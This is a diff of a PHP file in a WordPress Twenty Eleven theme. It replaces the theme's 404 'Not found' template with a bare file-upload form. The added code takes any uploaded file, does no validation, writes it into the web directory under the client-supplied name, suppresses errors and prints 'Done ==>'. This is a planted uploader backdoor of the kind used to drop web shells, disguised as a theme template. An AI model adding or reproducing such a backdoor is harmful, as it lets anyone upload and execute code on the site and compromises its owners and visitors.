@@ -1,33 +1,19 @@
 <?php
-/**
- * The template for displaying 404 pages (Not Found).
- *
- * @package WordPress
- * @subpackage Twenty_Eleven
- * @since Twenty Eleven 1.0
- */
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
 
-get_header(); ?>
-<div class="main-container">
-    <div class="main clearfix">
-		<div class="primary">
-            <h1>Not found <span>:(</span></h1>
-            <p>Sorry, but the page you were trying to view does not exist.</p>
-            <p>It looks like this was the result of either:</p>
-            <ul>
-                <li>a mistyped address</li>
-                <li>an out-of-date link</li>
-            </ul>
-            <script>
-                var GOOG_FIXURL_LANG = (navigator.language || '').slice(0,2),GOOG_FIXURL_SITE = location.host;
-            </script>
-            <script src="http://linkhelp.clients.google.com/tbproxy/lh/wm/fixurl.js"></script>
-        </div>
-        <aside class="sidebar">
-            <?php get_sidebar(); ?>
-        </aside>
-    </div> <!-- #main -->
-</div> <!-- #main-container -->
-
-
-<?php get_footer(); ?>
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if (isset($_FILES['image']['name'])) {
+        $abod = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $abod);
+  
+echo"<center><b>Done ==> $userfile_name</b></center>";
+}
+}
+else{
+echo'
+<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
+}
+?>
